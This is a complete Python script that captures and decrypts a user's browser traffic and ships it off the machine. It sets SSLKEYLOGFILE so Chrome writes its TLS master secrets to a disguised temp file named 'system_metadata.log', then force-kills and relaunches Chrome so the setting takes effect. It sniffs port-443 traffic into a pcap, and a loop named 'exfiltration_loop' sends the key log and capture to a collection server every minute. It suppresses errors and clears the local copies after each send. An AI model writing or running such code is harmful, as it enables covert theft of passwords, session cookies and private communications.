import os
import subprocess
import time
import socket
import threading
import sys
from scapy.all import sniff, wrpcap, conf, load_layer

# Load the Scapy cryptographic/TLS layer definitions explicitly
load_layer("tls")

# Configure Scapy to map and maintain TLS state across sequential packets
conf.tls_session_enable = True

# Import TCPSession to correctly handle TCP stream reassembly for TLS streams
from scapy.sessions import TCPSession 

# --- CONFIGURATION SETTINGS ---
SERVER_IP = "127.0.0.1"  # Destination address hosting the receiver script
SERVER_PORT = 5555       # Port target for outbound log transmission
TARGET_URL = "https://fixlabtech.com"

# Resolve the operating system temporary folder to write local flat file logs
TEMP_DIR = os.environ["TEMP"]
SSL_KEY_LOG = os.path.join(TEMP_DIR, "system_metadata.log")
PCAP_FILE = os.path.join(TEMP_DIR, "network_logs.pcap")

# --- INITIAL ENVIRONMENTAL SETUP ---
# Instruct the underlying Windows/Linux SSL library to dump master secrets
os.environ["SSLKEYLOGFILE"] = SSL_KEY_LOG
# Instruct Scapy's internal dissector to read the same file for on-the-fly decryption
conf.tls_nss_filename = SSL_KEY_LOG

# Global memory array to cache captured frames before performing disk writes
packet_buffer = []

def send_file(file_path):
    """
    Establishes a temporary TCP socket to stream the collected PCAP or Key log 
    to the centralized collection server. Clears the local log upon completion.
    """
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
        return
    try:
        filename = os.path.basename(file_path)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            # Send an explicit metadata header so the server handles the stream correctly
            s.send(f"FILE|{filename}".encode())
            time.sleep(1) # Prevent packet coalescing issues
            
            # Read and stream the raw file data bytes
            with open(file_path, "rb") as f:
                s.sendall(f.read())
                
        # Clear/truncate the file contents locally to prevent duplicate transmissions
        open(file_path, 'w').close() 
    except Exception:
        pass # Suppress network drops to prevent agent interruption

def packet_callback(packet):
    """
    Evaluates individual network frames passed by the sniffing engine.
    Appends validated layers to a memory buffer to limit sequential I/O operations.
    """
    if packet.haslayer("TLS") or packet.haslayer("Raw"):
        packet_buffer.append(packet)
        # Flush the memory cache to disk once 20 packets accumulate
        if len(packet_buffer) >= 20: 
            wrpcap(PCAP_FILE, packet_buffer, append=True)
            packet_buffer.clear()

def start_sniffing():
    """
    Spins up the Scapy capture engine, forcing TCP stream reassembly.
    """
    try:
        # Limit the capture to standard HTTPS traffic to save storage and CPU overhead
        # Use store=0 to keep Scapy from storing thousands of objects in RAM
        sniff(filter="tcp port 443", 
              prn=packet_callback, 
              session=TCPSession, 
              store=0)
    except Exception as e:
        print(f"[*] Sniffer encountered an interface error: {e}")

def browser_init():
    """
    Restarts Chrome to ensure the newly declared SSLKEYLOGFILE environmental 
    variable is hooked by active browser processes.
    """
    # Force close any existing browser process instances
    subprocess.run("taskkill /F /IM chrome.exe", shell=True, capture_output=True)
    time.sleep(2)
    # Relaunch the browser pointing directly to the target testing URL
    subprocess.Popen(f'start chrome "{TARGET_URL}"', shell=True)

def exfiltration_loop():
    """
    Background worker loop that triggers file transfers to the receiver 
    at regular 60-second intervals.
    """
    while True:
        time.sleep(60)
        send_file(SSL_KEY_LOG)
        send_file(PCAP_FILE)

if __name__ == "__main__":
    # Launch network analysis and transmission tasks inside background threads
    threading.Thread(target=start_sniffing, daemon=True).start()
    threading.Thread(target=exfiltration_loop, daemon=True).start()
    
    # Initialize the environmental hook and relaunch browser target
    browser_init()

    # Maintain primary script execution state indefinitely
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n[*] Exiting...")
